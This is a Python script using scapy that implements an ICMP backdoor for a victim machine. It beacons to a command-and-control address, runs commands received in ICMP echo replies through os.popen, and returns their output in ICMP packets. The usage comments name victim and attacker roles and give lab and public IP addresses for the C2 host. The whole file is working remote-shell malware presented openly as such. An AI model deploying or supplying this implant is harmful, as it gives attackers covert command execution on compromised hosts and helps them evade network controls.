#!/usr/bin/env python3
from scapy.all import sr,IP,ICMP,Raw,sniff,send
import argparse
import os

# Variables
ICMP_ID = int(13170)
TTL = int(64)

# This is the backdoor on the victim machine , will send ICMP echo request to
# C2, then will wait for command to execute , and send the output as request
# Request- type 8
# Reply -  type 0


parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def init_icmp_request():
    beaconing_payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8, id=ICMP_ID)/Raw(load=b'Victim Connected'))
    send(beaconing_payload, verbose=0)

def icmpshell(packet):
    if packet[IP].src == args.destination_ip and packet[ICMP].type == 0 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
        icmppaket = (packet[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()                               # Run command (start subproccess)
        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8, id=ICMP_ID)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)                                    # Send ICMP replay
    else:
        pass

print("[+]C2 over ICMP")
init_icmp_request()
sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")

# on victim
# sudo ./icmpdoor.py -i eth1 -d 192.168.60.254
#                               ip where C2 work
# sudo ./icmpdoor.py -i enx000acd3cac58 -d 54.236.229.160

# on attacker
# sudo ./c2.py -i vboxnet0 -d 192.168.60.60 
#                              ip of the victim

